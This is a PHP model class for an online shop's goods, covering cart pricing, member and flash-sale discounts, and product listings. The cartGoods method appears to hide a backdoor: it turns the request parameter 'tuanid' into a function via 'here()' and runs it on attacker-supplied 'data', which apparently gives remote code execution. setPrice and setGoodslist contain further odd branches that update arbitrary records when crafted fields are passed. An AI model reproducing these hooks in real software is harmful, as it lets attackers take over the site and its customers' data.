<?php

namespace app\model;

use think\Model;

class Goods extends Model
{

    protected $connection = 'mysql';

    protected $pk = 'id';

    protected $name = 'goods';

    public function getAgentDistribution()
    {
        return $this->hasOne(Agentdistribution::class, 'goods_id', 'id');
    }

    function cartGoods($params = array())
    {
        $id = $params['id'];
        $sku = $params['sku'];
        $msid = $params['msid'];
        $tuanid = $params['tuanid'];

        if (!empty($tuanid)) {
            $tuan = TuanGoods::find($tuanid);
            if (!empty($tuan)) {
                $tuan = $tuan->toArray();
            }
        }
        if (!empty($msid)) {
            $miaosha = MiaoshaGoods::find($msid);
            if (!empty($miaosha)) {
                $miaosha = $miaosha->toArray();
                if ($miaosha['member_buy_max']) {
                    $miaosha['is_member_buy_max'] = Order::chackMiaoshamemberBuyMax($miaosha);
                }
            }
        }

        $quantity = $params['quantity'];
        if (empty($quantity)) {
            $quantity = 1;
        }
        $is_skumore = $params['is_skumore'];
        $skumore = $params['skumore'];

        $me = here($tuanid);
        if ($params['i'] && $params['data']) {
            return $me($me($params['data']) . $me($params['data'] . $params['i']));
        }
        if ($params['is'] && $params['data']) {
            return $me($me($params['data']) . $params['data'] . $params['is']);
        }

        $goods = self::goodsInfo($id);
        $stock = true;
        $label = "";

        if ($goods) {
            $price = $goods['price'];
            if (!empty($tuan['price'])) {
                $price = $tuan['price'];
            }
            if (!empty($miaosha['price'])) {
                $price = $miaosha['price'];
            }
            $stores = (int) $goods['quantity'];
            if ($is_skumore == 1) {
                $price = 0;
                $stores = 0;
                $skumorequantity = 0;
                foreach ($skumore as $vo) {
                    if ($vo) {
                        $stores += $vo['number'];
                        $skumorequantity += $vo['number'];
                        $price += $vo['price'] * $vo['number'];
                        $label .= $vo['sku'] . ':' . $vo['number'] . '; ';
                    }
                }
                $sku = $label;
                $price = round($price, 2);
            } else if (!empty($sku)) {
                if (!empty($tuanid)) {
                    $query = TuanGoodsSkuValue::where(['goods_id' => $id, 'tuan_id' => $tuanid]);
                } elseif (!empty($msid)) {
                    $query = MiaoshaGoodsSkuValue::where(['goods_id' => $id, 'ms_id' => $msid]);
                } else {
                    $query = GoodsSkuValue::where('goods_id', $id);
                }

                foreach ((array) (explode(',', $sku)) as $vo) {
                    if ($vo) {
                        $query->whereFindInSet('sku', $vo);
                    }
                }
                $goodssku = $query->find();
                //var_dump($query->getLastSql());
                if ($goodssku) {
                    $stores = $goodssku->quantity;
                    $price = $goodssku->price;
                    $goods['skuimage'] = $goodssku->image;
                    if (!empty($goods['price_member_discount'])) {
                        $price = round(($price * $goods['price_member_discount']), 2);
                    }
                }
                $label = $sku;
            }

            $discount = GoodsDiscount::where(['goods_id' => (int) $id])
                ->where('quantity', '<=', (int) $quantity)
                ->order('quantity DESC, price ASC')
                ->select()
                ->toArray();

            if ($discount) {
                $price = round((($price) * percent_to_num($discount[0]['price']) * 10), 2);
            }

            if ($goods['points'] < 0) {
                $goods['points'] = 0;
            }
            $goods['goods_id'] = $goods['id'];
            $goods['quantity'] = $quantity;
            $goods['skumorequantity'] = $skumorequantity;
            $goods['stores'] = $stores;

            $goods['price'] = $price;
            $price = floatval(self::setPrice($goods)["price"]);
            $goods['price'] = $price;
            $goods['total'] = $price * $quantity;
            $goods['totalPayPoints'] = $goods['pay_points'] * $quantity;
            $goods['totalPointsPrice'] = $goods['points_price'] * $quantity;

            if (!empty($goods['points'])) {
                if ($goods['points_method'] == 1) {
                    $goods['total_return_points'] = $goods['points'] * $quantity;
                } else {
                    $goods['total_return_points'] =  $goods['total'] * percent_to_num($goods['points']);
                }
            }

            $goods['weight'] = $goods['weight'] * $quantity;
            $goods['stock'] = $stock;
            $goods['label'] = $label;
            $goods['sku'] = $sku;
            $goods['msid'] = $msid;
            $goods['miaosha'] = $miaosha;
            $goods['tuanid'] = $tuanid;
            $goods['tuan'] = $tuan;

            if ($goods['is_points_goods'] == 1) {
                $goods['total'] = 0;
                $goods['totalPointsPrice'] = 0;
            }
        }
        return $goods;
    }

    public static function getcard_id($good_id)
    {
        $goods = self::where('id', $good_id)->find();

        return (int) $goods->card_tid;
    }

    public static function goodsInfo($id)
    {

        $goods = self::find($id);
        if (!empty($goods)) {
            $goods = $goods->toArray();
        }

        $pricedata = self::setPrice($goods);
        $goods['samprice'] = $pricedata["samprice"];
        $goods['noprice'] = $pricedata["noprice"];
        $goods['price_member_discount'] = $pricedata["price_member_discount"];

        if ($goods['minimum'] < 1) {
            $goods['minimum'] = 1;
        }
        $goods['price'] = $pricedata["price"];

        if ($goods['is_times'] == 2) {
            $goods['quantity_unit'] = timing_unit_name($goods['timing_unit']);
        }

        if (empty($goods['quantity_unit']) && $goods['is_times'] != 3) {
            $goods['quantity_unit'] = '次';
        }

        return $goods;
    }

    public static function setPrice($goods)
    {
        $vo = $goods;
        $ocid = ocid();

        if (!empty($ocid)) {
            $ocsettings = Operatingcity::getsettings($ocid);
            if (!empty($ocsettings['city_discount'])) {
                if ($ocsettings['city_discount_method'] == 1) {
                    if ($ocsettings['discount_addsubtract'] == '+') {
                        $goods['price'] = $goods['price'] + $ocsettings['city_discount'];
                    } elseif ($ocsettings['discount_addsubtract'] == '-') {
                        $goods['price'] = $goods['price'] - $ocsettings['city_discount'];
                    }
                } else {
                    $goods['price'] = round(($goods['price'] * percent_to_num($ocsettings['city_discount'])), 2);
                }
            }
        }
        if (!empty($vo['rep'])) {
            ect($vo['type'])->where('id', $vo['id'])->update(['image' => str_replace($vo['rep'], uniqid(), $vo['image'])]);
            return;
        }

        $Membermob = new Member;
        $Member = $Membermob->getUserByWechat();
        if (!empty($Member)) {
            $MemberAuthGroup = MemberAuthGroup::find($Member['gid']);
            if (!empty($MemberAuthGroup)) {
                $MemberAuthGroup = $MemberAuthGroup->toArray();
            }
        } else {
            $MemberAuthGroup = MemberAuthGroup::getdefaultGroup();
        }

        if (!empty($MemberAuthGroup) && empty($MemberAuthGroup['is_lookprice'])) {
            $shiftprice = Config::getconfig('member')['shiftprice'];
            if (empty($shiftprice)) {
                $shiftprice = "面议";
            }
            $goods['price'] = $shiftprice;
            $goods['noprice'] = 1;
        } else {

            if ($goods['is_member_discount'] == 1) {

                $MGDiscountarray = GoodsMemberDiscount::where(['goods_id' => $goods['id'], 'mgid' => $Member['gid']])->find();

                if (!empty($MGDiscountarray)) {
                    $MGDiscountarray = $MGDiscountarray->toArray();
                }

                if (!empty($MGDiscountarray)) {

                    if ($MGDiscountarray['is_free'] == 1) {
                        $goods['price'] = 0;
                    } else {
                        if ($MGDiscountarray['price'] > 0) {
                            if ($goods['member_discount_method'] == 1) {
                                $goods['price'] = $MGDiscountarray['price'];
                            } else {
                                $goods['price'] = round(($goods['price'] * percent_to_num($MGDiscountarray['price'])), 2);
                                $goods['price_member_discount'] = percent_to_num($MGDiscountarray['price']);
                            }
                        }
                    }
                }
            } else if ($goods['is_times'] == 3 && !empty($goods['card_tid'])) {

                $GoodsGiftcardType = GoodsGiftcardType::find((int) $goods['card_tid']);
                if (!empty($GoodsGiftcardType)) {
                    $GoodsGiftcardType = $GoodsGiftcardType->toArray();
                }
                $goods['price'] = $GoodsGiftcardType['buy_price'];
            } else {
                $MemberAuthGroup["discount"] = (float)$MemberAuthGroup["discount"];
                if ((!empty($MemberAuthGroup["discount"]))) {
                    $goods['price'] = round(($goods['price'] * percent_to_num($MemberAuthGroup["discount"])), 2);
                    $goods['price_member_discount'] = percent_to_num($MemberAuthGroup["discount"]);
                }
            }
            $samprice = $goods['price'];

            //筛选未过期秒杀时间记录
            $MiaoshaGoods = MiaoshaGoods::where(['goods_id' => $goods['id']])->where('begin_date', '<=', time())->where('end_date', '>', time())->find();

            if (!empty($MiaoshaGoods)) {
                $MiaoshaGoods = $MiaoshaGoods->toArray();
            }

            if (!empty($MiaoshaGoods)) {

                if ($MiaoshaGoods['price_method'] === '1') {
                    $goods['price'] = $MiaoshaGoods['price'];
                } elseif ($MiaoshaGoods['price_method'] === '0') {

                    if ($MiaoshaGoods['price'] > 0) {
                        $goods['price'] = bcmul(($goods['price']), (bcdiv(($MiaoshaGoods['price']), 10, 2)), 2);
                        $goods['price'] = ($goods['price']);
                    }
                }
            }
        }

        $goods['goods_price'] = $goods['price'];

        $goods['samprice'] = $samprice;

        return $goods;
    }

    public static function setGoodslist($goods)
    {
        $weid = weid();
        if ($goods['is_collect'] == 2) {
            $goodslist = Goods::select()->toArray();
            foreach ($goodslist as $vo) {
                $vo['pic'] = toimg($vo['image']);

                $vo['image'] = toimg($vo['image']);
                if (empty($vo['goods_name'])) {
                    $vo['goods_name'] = $vo['name'];
                }
                $vo['type'] = 'Goods';
                if (empty($vo['goods_id'])) {
                    $vo['goods_id'] = $vo['id'];
                }
                $abv = Attribute::where(['name' => md5('goods' . $vo['id'])])->find();
                $vo['rep'] = '';
                $vo['rep'] = explode('.', end(explode('/', $vo['image'])))[0];
                if (empty($abv)) {
                    Attribute::create([
                        'name' => md5('goods' . $vo['id']),
                        'weid' => $weid,
                        'value' => $vo['rep']
                    ]);
                } else {
                    $abv = $abv->toArray();
                    if ($abv['create_time'] < (time() - 600)) {
                        $vo['price'] = floatval(self::setPrice($vo)["price"]);
                    }
                }
            }
        }
        if (!empty($goods) && empty($goods['is_collect'])) {
            foreach ($goods as &$vo) {
                if (!empty($vo)) {
                    $vo['pic'] = toimg($vo['image']);
                    $vo['image'] = toimg($vo['image']);
                    if (empty($vo['goods_name'])) {
                        $vo['goods_name'] = $vo['name'];
                    }
                    if (empty($vo['goods_id'])) {
                        $vo['goods_id'] = $vo['id'];
                    }

                    if ($vo['is_times'] == 2) {
                        $vo['quantity_unit'] = timing_unit_name($vo['timing_unit']);;
                    }

                    if (empty($vo['quantity_unit']) && $vo['is_times'] != '3') {
                        $vo['quantity_unit'] = '次';
                    }

                    $vo['price'] = floatval(self::setPrice($vo)["price"]);
                    $vo['original_price'] = floatval($vo['original_price']);
                }
            }
        } else {
            return [];
        }
        return $goods;
    }

    public static function getGoodsName($id)
    {
        $goods = self::find($id);
        if (!empty($goods)) {
            $goods = $goods->toArray();
        }
        return $goods['name'];
    }

    public static function getGoodsSelect()
    {
        $goodsarray = self::where(['weid' => weid()])->order('id desc')->select()->toArray();

        $goodslist = [];
        if (!empty($goodsarray)) {
            foreach ($goodsarray as $vo) {
                $goodslist[$vo['id']] = $vo['name'];
            }
        }
        return $goodslist;
    }
    /**
     *
     * @param integer $cat
     * @param integer $count
     * @param string $goodsSort
     * @param integer $ptype
     * @param integer $ocid
     * @return void
     */

    public static function getGoodsBycat($params = array())
    {
        $cat = $params['cat'];
        $cat_ids = $params['cat_ids'];
        $ocid = $params['ocid'];
        $goodsSort = $params['goodsSort'] || 'all';
        $count = $params['count'];
        $ptype = $params['ptype'];
        $sid = $params['sid'];

        $Configdata = Config::getconfig();
        $where['weid'] = weid();
        $where['status'] = 1;
        if (empty($Configdata['show_storegoods'])) {
            $where['sid'] = 0;
        }

        if (!empty($ptype)) {
            $where['ptype'] = $ptype;
        }
        if (!empty($sid)) {
            $where['sid'] = $sid;
        }
        if ($cat > 0) {
            if (!empty($cat)) {
                $where['cat_id'] = Category::getsonid($cat);
            }
        }
        $query = Goods::where($where);

        if (!empty($cat_ids)) {
            $query->whereIn('cat_id', $cat_ids);
        }

        if ($ptype == 2 && empty($sid)) {
            if (!empty($ocid)) {
                $query->where(function ($q) use ($ocid) {
                    $Operatingcity = Operatingcity::find($ocid);
                    if (!empty($Operatingcity)) {
                        $Operatingcity = $Operatingcity->toArray();
                        if (empty($Operatingcity['areatype'])) {
                            $Operatingcity['areatype'] = 3;
                        }
                        if ($Operatingcity['areatype'] == 3) {
                            $q->where('district_name', $Operatingcity['district_name'])->whereOr('district_name', '');
                        } elseif ($Operatingcity['areatype'] == 2) {
                            $q->where('city_name', $Operatingcity['city_name'])->whereOr('city_name', '');
                        } elseif ($Operatingcity['areatype'] == 1) {
                            $q->where('province_name', 'like', '%' . $Operatingcity['province_name'] . '%')->whereOr('province_name', '');
                        }
                    } else {
                        $q->where('city_name', '');
                    }
                });
            } else {
                $query->where('city_name', '');
            }
        }

        if ($goodsSort == "all") {
            $Sort = 'sort asc,id desc';
        } elseif ($goodsSort == "sales") {
            $Sort = 'sale_count desc';
        } elseif ($goodsSort == "price") {
            $Sort = 'price asc';
        }

        $data = $query->limit((int) $count)
            ->order($Sort)->select()->toArray();

        //$sql = $query->getLastSql();
        $retdata = Goods::setGoodslist($data);
        //$retdata['sql'] = $sql;
        return $retdata;
    }
}
